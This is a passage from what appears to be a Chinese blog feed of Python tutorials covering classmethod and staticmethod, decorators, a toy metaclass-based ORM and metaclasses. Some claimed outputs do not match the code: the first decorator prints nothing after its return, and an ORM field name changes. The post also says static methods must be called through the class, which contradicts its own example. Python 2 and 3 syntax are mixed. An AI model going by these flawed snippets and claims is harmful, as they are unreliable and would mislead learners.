<p>我们先来看一个简单的实例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self,x)</span>:</span></div><div class="line">        <span class="keyword">print</span> (<span class="string">"executing foo(%s,%s)"</span>%(self,x))</div><div class="line"></div><div class="line"><span class="meta">    @classmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">class_foo</span><span class="params">(cls,x)</span>:</span></div><div class="line">        <span class="keyword">print</span> (<span class="string">"executing class_foo(%s,%s)"</span>%(cls,x))</div><div class="line"></div><div class="line"><span class="meta">    @staticmethod</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">static_foo</span><span class="params">(x)</span>:</span></div><div class="line">        <span class="keyword">print</span> (<span class="string">"executing static_foo(%s)"</span>%x)</div></pre></td></tr></table></figure>
<p>我们定义了一个<code>class A</code>，类A里面分别定义了普通方法foo，<code>@classmethod</code>修饰的类方法class_foo，还有<code>@staticmethod</code>修饰的静态方法static_foo，那么他们之间有什么区别呢？<br>我们不妨来验证一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">a=A()</div><div class="line">print(a.foo)</div><div class="line">print(a.class_foo)</div><div class="line">print(a.static_foo)</div><div class="line"></div><div class="line"><span class="comment"># 输出结果</span></div><div class="line"><span class="comment"># &lt;bound method A.foo of &lt;__main__.A object at 0x0121B950&gt;&gt;</span></div><div class="line"><span class="comment"># &lt;bound method A.class_foo of &lt;class '__main__.A'&gt;&gt;</span></div><div class="line"><span class="comment"># &lt;function A.static_foo at 0x01222078&gt;</span></div></pre></td></tr></table></figure>
<p>我们从输出结果可以看到：</p>
<ul>
<li>foo是绑定在实例a上的，参数self便是实例a本身</li>
<li>class_foo是绑定在class A上的，参数cls指向class A本身</li>
<li>static_foo不绑定在a或者A上，所以没有额外的参数</li>
</ul>
<h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2. 使用"></a>2. 使用</h1><p>那么使用上有什么区别呢？<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">a = A()</div><div class="line">a.foo(<span class="number">1</span>)</div><div class="line">a.class_foo(<span class="number">1</span>)</div><div class="line">a.static_foo(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="comment"># A.foo(2) #error</span></div><div class="line">A.class_foo(<span class="number">2</span>)</div><div class="line">A.static_foo(<span class="number">2</span>)</div><div class="line"></div><div class="line"><span class="comment"># 输出结果</span></div><div class="line"><span class="comment"># executing foo(&lt;__main__.A object at 0x0121B950&gt;,1)</span></div><div class="line"><span class="comment"># executing class_foo(&lt;class '__main__.A'&gt;,1)</span></div><div class="line"><span class="comment"># executing static_foo(1)</span></div><div class="line"><span class="comment"># executing class_foo(&lt;class '__main__.A'&gt;,2)</span></div><div class="line"><span class="comment"># executing static_foo(2)</span></div></pre></td></tr></table></figure></p>
<p>从上面的代码我们可以看到，使用上的区别：</p>
<ul>
<li>foo是绑定在实例a上的，只能通过实例去调用</li>
<li>class_foo绑定在类A上，可以通过实例a或者类A去调用</li>
<li>static_foo不绑定任何参数，也可以通过实例a或者类A去调用</li>
</ul>
<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h1><p>类和实例都是对象，所以它们可以有方法：</p>
<ul>
<li>实例的方法就叫实例方法。</li>
<li>类的方法就叫类方法。</li>
<li>静态方法就是写在类里的普通方法,必须用类来调用，比如说有一些跟类有关系的功能，但是运行的时候又不需要实例和类参与的函数，这个时候就可以用@staticmethod，因为如果写一堆全局函数，可能后续会变得难以维护。</li>
</ul>
<p>References：</p>
<ul>
<li><a href="https://taizilongxu.gitbooks.io/stackoverflow-about-python/content/14/README.html" target="_blank" rel="external">装饰器@staticmethod和@classmethod有什么区别?</a></li>
<li><a href="http://www.wklken.me/posts/2013/12/22/difference-between-staticmethod-and-classmethod-in-python.html" target="_blank" rel="external">[翻译]PYTHON中STATICMETHOD和CLASSMETHOD的差异</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;花两分钟了解什么是实例方法，类方法，静态方法。&lt;/p&gt;
    
    </summary>
    
      <category term="Python基础" scheme="https://maoao530.github.io/categories/Python%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Python" scheme="https://maoao530.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>python 装饰器decorator</title>
    <link href="https://maoao530.github.io/2016/05/17/python-decorator/"/>
    <id>https://maoao530.github.io/2016/05/17/python-decorator/</id>
    <published>2016-05-17T15:08:59.000Z</published>
    <updated>2016-12-10T05:37:05.784Z</updated>
    
    <content type="html"><![CDATA[<p>2分钟告诉你什么是python装饰器。</p>
<a id="more"></a>
<h1 id="1-什么是装饰器"><a href="#1-什么是装饰器" class="headerlink" title="1. 什么是装饰器"></a>1. 什么是装饰器</h1><p>Python的装饰器的英文名叫<code>Decorator</code>，这个和设计模式中的<code>Decorator Pattern</code>是两种东西。<br>Python中的装饰器主要用于对已经有的模块做一些“修饰工作”。比如说，我们经常需要在函数调用前后自动打印日志，又不想要改变原有函数的模块，这个时候，我们便可以写一个打印log的装饰器。</p>
<h1 id="2-Hello-World"><a href="#2-Hello-World" class="headerlink" title="2. Hello World"></a>2. Hello World</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 定义log装饰器</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></div><div class="line">        print(<span class="string">'start %s()'</span> % func.__name__)</div><div class="line">        <span class="keyword">return</span> func(*args, **kw)</div><div class="line">        print(<span class="string">'end %s()'</span> % func.__name__)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="meta">@log</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'foo function ...'</span>)</div><div class="line"></div><div class="line">foo()</div></pre></td></tr></table></figure>
<p>当运行代码，你会发现有如下输出：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">C:\Users\maoao\Desktop\Project&gt;python Test.py</div><div class="line">start foo()</div><div class="line">foo function ...</div><div class="line">end foo()</div></pre></td></tr></table></figure></p>
<p>有木有发现很神奇？</p>
<h1 id="3-Decorator-的本质"><a href="#3-Decorator-的本质" class="headerlink" title="3. Decorator 的本质"></a>3. Decorator 的本质</h1><p>对于Python的这个@注解语法糖来说，当你在用某个@decorator来修饰某个函数func时，如下所示:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@log</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'foo function ...'</span>)</div></pre></td></tr></table></figure></p>
<p>相当于执行了语句：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foo = log(foo)</div></pre></td></tr></table></figure></p>
<p>其实就是把一个函数当参数传到另一个函数中，然后再把decorator这个函数的返回值赋值回了原来的func。</p>
<p>不信我们可以做如下验证：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuck</span><span class="params">(fn)</span>:</span></div><div class="line">    <span class="keyword">print</span> (<span class="string">"fuck %s ! "</span> % fn.__name__.upper())</div><div class="line"> </div><div class="line"><span class="meta">@fuck</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gfw</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
<p>还没有执行gfw就输出我们每个人的心声了有木有。</p>
<p>知道这点本质，当你看到有<strong>多个decorator</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@decorator_one</span></div><div class="line"><span class="meta">@decorator_two</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
<p>相当于：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func = decorator_one(decorator_two(func))</div></pre></td></tr></table></figure></p>
<p><strong>带参数的decorator</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@decorator(arg1, arg2)</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure></p>
<p>相当于：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">func = decorator(arg1,arg2)(func)</div></pre></td></tr></table></figure></p>
<p>这意味着decorator(arg1, arg2)这个函数需要返回一个“真正的decorator”。</p>
<h1 id="4-带参数的装饰器示例"><a href="#4-带参数的装饰器示例" class="headerlink" title="4. 带参数的装饰器示例"></a>4. 带参数的装饰器示例</h1><p>假设我们可以编写一个带参数的装饰器：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></div><div class="line">            print(<span class="string">'%s, start %s()'</span> % (text, func.__name__))</div><div class="line">            func(*args, **kw)</div><div class="line">            print(<span class="string">'%s, end %s()'</span> % (text, func.__name__))</div><div class="line">        wrapper.__name__ = func.__name__</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div><div class="line"></div><div class="line"><span class="meta">@log('SHUN_TAG')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'foo function ...'</span>)</div><div class="line"></div><div class="line">foo()</div><div class="line"><span class="keyword">print</span> foo.__name__</div><div class="line"></div><div class="line"><span class="comment"># 输出：</span></div><div class="line"></div><div class="line"><span class="comment"># C:\Users\maoao\Desktop\Project&gt;python Test.py</span></div><div class="line"><span class="comment"># SHUN_TAG, start foo()</span></div><div class="line"><span class="comment"># foo function ...</span></div><div class="line"><span class="comment"># SHUN_TAG, end foo()</span></div><div class="line"><span class="comment"># foo</span></div></pre></td></tr></table></figure></p>
<p>@@log(‘SHUN_TAG’)实际上会执行如下语句：<br><code>foo = log(&#39;SHUN_TAG&#39;)(foo)</code><br>然后<strong>最终会返回wrapper函数给foo</strong>，另外要记得<code>wrapper.__name__ = func.__name__</code>，防止有些函数签名的代码回报错。</p>
<p>也可以用@functools.wraps(func)来代替上述写法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></div><div class="line"><span class="meta">        @functools.wraps(func)</span></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kw)</span>:</span></div><div class="line">            print(<span class="string">'%s, start %s()'</span> % (text, func.__name__))</div><div class="line">            func(*args, **kw)</div><div class="line">            print(<span class="string">'%s, end %s()'</span> % (text, func.__name__))</div><div class="line">        <span class="keyword">return</span> wrapper</div><div class="line">    <span class="keyword">return</span> decorator</div></pre></td></tr></table></figure></p>
<p>其实也没有什么复杂的东西。</p>
<h1 id="5-class式的-Decorator"><a href="#5-class式的-Decorator" class="headerlink" title="5. class式的 Decorator"></a>5. class式的 Decorator</h1><p>最后再来看下decorator的class方式，还是看个示例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDecorator</span><span class="params">(object)</span>:</span></div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, fn)</span>:</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"inside myDecorator.__init__()"</span></div><div class="line">        self.fn = fn</div><div class="line"> </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self)</span>:</span></div><div class="line">        self.fn()</div><div class="line">        <span class="keyword">print</span> <span class="string">"inside myDecorator.__call__()"</span></div><div class="line"> </div><div class="line"><span class="meta">@myDecorator</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">aFunction</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"inside aFunction()"</span></div><div class="line"> </div><div class="line"><span class="keyword">print</span> <span class="string">"Finished decorating aFunction()"</span></div><div class="line"> </div><div class="line">aFunction()</div><div class="line"> </div><div class="line"><span class="comment"># 输出：</span></div><div class="line"><span class="comment"># inside myDecorator.__init__()</span></div><div class="line"><span class="comment"># Finished decorating aFunction()</span></div><div class="line"><span class="comment"># inside aFunction()</span></div><div class="line"><span class="comment"># inside myDecorator.__call__()</span></div></pre></td></tr></table></figure></p>
<p>用类的方式声明一个decorator。我们可以看到这个类中有两个成员：</p>
<ul>
<li>一个是<strong>init</strong>()，这个方法是在我们给某个函数decorator时被调用，所以，需要有一个fn的参数，也就是被decorator的函数。</li>
<li>一个是<strong>call</strong>()，这个方法是在我们调用被decorator函数时被调用的。<br>上面输出可以看到整个程序的执行顺序。</li>
</ul>
<h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h1><p>decorator可以增强函数的功能，定义起来虽然有点复杂，但使用起来非常灵活和方便。</p>
<p>References:</p>
<ul>
<li><a href="http://coolshell.cn/articles/11265.html" target="_blank" rel="external">Python修饰器的函数式编程</a></li>
<li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014318435599930270c0381a3b44db991cd6d858064ac0000" target="_blank" rel="external">廖雪峰的教程</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2分钟告诉你什么是python装饰器。&lt;/p&gt;
    
    </summary>
    
      <category term="Python基础" scheme="https://maoao530.github.io/categories/Python%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="python" scheme="https://maoao530.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>如何构建一个orm框架？</title>
    <link href="https://maoao530.github.io/2016/04/25/python-orm/"/>
    <id>https://maoao530.github.io/2016/04/25/python-orm/</id>
    <published>2016-04-25T15:54:48.000Z</published>
    <updated>2016-12-10T05:37:25.051Z</updated>
    
    <content type="html"><![CDATA[<p>ORM全称“Object Relational Mapping”，即对象-关系映射，就是把关系数据库的一行映射为一个对象，也就是一个类对应一个表，这样，写代码更简单，不用直接操作SQL语句。</p>
<a id="more"></a>
<h1 id="1-开始之前"><a href="#1-开始之前" class="headerlink" title="1. 开始之前"></a>1. 开始之前</h1><p>开始之前，请先掌握python metaclass的知识，请参考我的文章：<a href="https://maoao530.github.io/2016/04/12/python-metaclass/">从Python Metaclass说起</a>  </p>
<p>为什么要使用metaclass？因为要编写一个ORM框架，所有的类都只能动态定义，只有使用者才能根据表的结构定义出对应的类来。</p>
<p>掌握了元类的知识后，我们来尝试编写一个ORM框架。首先，假设我们有一个User表，那么我们可能会写出如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(Model)</span>:</span></div><div class="line">    <span class="comment"># 定义类的属性到列的映射：</span></div><div class="line">    id = IntegerField(<span class="string">'id'</span>)</div><div class="line">    name = StringField(<span class="string">'username'</span>)</div><div class="line">    email = StringField(<span class="string">'email'</span>)</div><div class="line">    password = StringField(<span class="string">'password'</span>)</div><div class="line"></div><div class="line"><span class="comment"># 创建一个实例：</span></div><div class="line">u = User(id=<span class="number">12345</span>, name=<span class="string">'Michael'</span>, email=<span class="string">'test@orm.org'</span>, password=<span class="string">'my-pwd'</span>)</div><div class="line"><span class="comment"># 保存到数据库：</span></div><div class="line">u.save()</div></pre></td></tr></table></figure></p>
<p>怎么样？我们可以不用直接去操作SQL了，看上去是不是非常简单呢？</p>
<h1 id="2-设计Field类"><a href="#2-设计Field类" class="headerlink" title="2. 设计Field类"></a>2. 设计Field类</h1><p>接下来我们要定义Field类，它负责保存数据库表的<strong>字段名</strong>和<strong>字段类型</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Field</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, column_type)</span>:</span></div><div class="line">        self.name = name</div><div class="line">        self.column_type = column_type</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> <span class="string">'&lt;%s:%s&gt;'</span> % (self.__class__.__name__, self.name)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">StringField</span><span class="params">(Field)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></div><div class="line">        super(StringField, self).__init__(name, <span class="string">'varchar(100)'</span>)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">IntegerField</span><span class="params">(Field)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></div><div class="line">        super(IntegerField, self).__init__(name, <span class="string">'bigint'</span>)</div></pre></td></tr></table></figure>
<h1 id="3-设计Model类"><a href="#3-设计Model类" class="headerlink" title="3. 设计Model类"></a>3. 设计Model类</h1><p>Model类是数据库表类的基类。</p>
<p>在Model类中，就可以定义各种操作数据库的方法，比如save()，delete()，find()，update等等：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 创建Model类时，指定通过ModelMetaclass来创建</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span><span class="params">(dict, metaclass=ModelMetaclass)</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, **kw)</span>:</span></div><div class="line">        print(<span class="string">"Model __init__ : "</span>, kw )</div><div class="line">        super(Model, self).__init__(**kw)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, key)</span>:</span></div><div class="line">        print(<span class="string">"__getattr__: %s &gt; %s"</span> % (key,self[key]))</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">return</span> self[key]</div><div class="line">        <span class="keyword">except</span> KeyError:</div><div class="line">            <span class="keyword">raise</span> AttributeError(<span class="string">r"'Model' object has no attribute '%s'"</span> % key)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, key, value)</span>:</span></div><div class="line">        print(<span class="string">"__setattr__ : "</span>, key)</div><div class="line">        self[key] = value</div><div class="line"></div><div class="line">    <span class="comment">#只是模拟打印出sql语句</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self)</span>:</span></div><div class="line">        fields = []</div><div class="line">        params = []</div><div class="line">        args = []</div><div class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> self.__mappings__.items():</div><div class="line">            fields.append(v.name)  <span class="comment"># id,username,email,password 字段名</span></div><div class="line">            params.append(<span class="string">'?'</span>)     <span class="comment"># ????</span></div><div class="line">            args.append(getattr(self, k, <span class="keyword">None</span>))</div><div class="line">        sql = <span class="string">'insert into %s (%s) values (%s)'</span> % (self.__table__, <span class="string">','</span>.join(fields), <span class="string">','</span>.join(params))</div><div class="line">        print(<span class="string">'SQL: %s'</span> % sql)</div><div class="line">        print(<span class="string">'ARGS: %s'</span> % str(args))</div></pre></td></tr></table></figure>
<h1 id="4-设计ModelMetaclass元类"><a href="#4-设计ModelMetaclass元类" class="headerlink" title="4. 设计ModelMetaclass元类"></a>4. 设计ModelMetaclass元类</h1><p>最后就是mnetaclass元类的编写了。</p>
<p>使用Model中定义的metaclass的ModelMetaclass来创建User类，也就是说，<strong>metaclass可以隐式地继承到子类</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ModelMetaclass</span><span class="params">(type)</span>:</span></div><div class="line">    <span class="comment"># 准备创建的类的对象，类名，父类集合，类方法集合</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, name, bases, attrs)</span>:</span></div><div class="line">        print(<span class="string">'Found model: %s'</span> % name)</div><div class="line">        <span class="keyword">if</span> name==<span class="string">'Model'</span>:</div><div class="line">            <span class="keyword">return</span> type.__new__(cls, name, bases, attrs)</div><div class="line">        </div><div class="line">        mappings = dict()</div><div class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> attrs.items():</div><div class="line">            <span class="keyword">if</span> isinstance(v, Field):</div><div class="line">                print(<span class="string">'Found mapping: %s ==&gt; %s'</span> % (k, v))</div><div class="line">                mappings[k] = v</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> mappings.keys():</div><div class="line">            attrs.pop(k)</div><div class="line">        attrs[<span class="string">'__mappings__'</span>] = mappings    <span class="comment"># 保存属性和列的映射关系</span></div><div class="line">        attrs[<span class="string">'__table__'</span>] = name           <span class="comment"># 假设表名和类名一致</span></div><div class="line">        <span class="keyword">return</span> type.__new__(cls, name, bases, attrs)</div></pre></td></tr></table></figure>
<p>至此，核心代码基本上写完了，怎么样？看起来也不是很难。我们来梳理一下：</p>
<ol>
<li>定义一个class User(Model)类</li>
<li>Python解释器通过父类Model的metaclass找到ModelMetaclass类，通过它来创建User</li>
<li>ModelMetaclass保存User类的一些信息，比如表名，字段等</li>
<li>当我们调用save()方法时，会去用到第三步骤保存的信息，构造出SQL语句，将数据保存到数据库中</li>
</ol>
<p>我们编写代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">u = User(id=<span class="number">12345</span>, name=<span class="string">'Michael'</span>, email=<span class="string">'test@orm.org'</span>, password=<span class="string">'my-pwd'</span>)</div><div class="line">u.save()</div></pre></td></tr></table></figure></p>
<p>输出：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Found model: User</div><div class="line">Found mapping: email ==&gt; &lt;StringField:email&gt;</div><div class="line">Found mapping: password ==&gt; &lt;StringField:password&gt;</div><div class="line">Found mapping: id ==&gt; &lt;IntegerField:uid&gt;</div><div class="line">Found mapping: name ==&gt; &lt;StringField:username&gt;</div><div class="line">SQL: insert into User (password,email,username,id) values (?,?,?,?)</div><div class="line">ARGS: ['my-pwd', 'test@orm.org', 'Michael', 12345]</div></pre></td></tr></table></figure></p>
<p>可以看到，save()方法打印出了SQL语句和参数列表，我们可以根据自己的需求，来将此信息存储到数据库中。</p>
<p>References:</p>
<ul>
<li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014319106919344c4ef8b1e04c48778bb45796e0335839000" target="_blank" rel="external">廖雪峰的教程</a> </li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ORM全称“Object Relational Mapping”，即对象-关系映射，就是把关系数据库的一行映射为一个对象，也就是一个类对应一个表，这样，写代码更简单，不用直接操作SQL语句。&lt;/p&gt;
    
    </summary>
    
      <category term="Python进阶" scheme="https://maoao530.github.io/categories/Python%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Python" scheme="https://maoao530.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>从Python Metaclass说起...</title>
    <link href="https://maoao530.github.io/2016/04/12/python-metaclass/"/>
    <id>https://maoao530.github.io/2016/04/12/python-metaclass/</id>
    <published>2016-04-12T15:50:27.000Z</published>
    <updated>2016-12-10T05:37:17.874Z</updated>
    
    <content type="html"><![CDATA[<p>在Python中，所有数据类型都可以视为对象，当然也可以自定义对象。自定义的对象数据类型就是面向对象中的类（’Class’）的概念。<br>类也是对象，可以把类看成是元类（’Metaclass’）创建出来的对象。</p>
<a id="more"></a>
<h1 id="1-理解python中的class"><a href="#1-理解python中的class" class="headerlink" title="1. 理解python中的class"></a>1. 理解python中的class</h1><p>在理解元类之前，你需要先掌握Python中的类。类同样也是一种<code>对象</code>。是的，没错，就是对象。只要你使用关键字class，Python解释器在执行的时候就会创建一个对象。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line">s = S()</div><div class="line"><span class="keyword">print</span> (s) <span class="comment"># &lt;__main__.S object at 0x00F3B390&gt;</span></div><div class="line"><span class="keyword">print</span> (S) <span class="comment"># &lt;class '__main__.S'&gt;</span></div></pre></td></tr></table></figure>
<p>通过以上片段我们可以知道，’s’是一个对象实例，而’S’是一个类。而通过type()我们可以查看它的类型：</p>
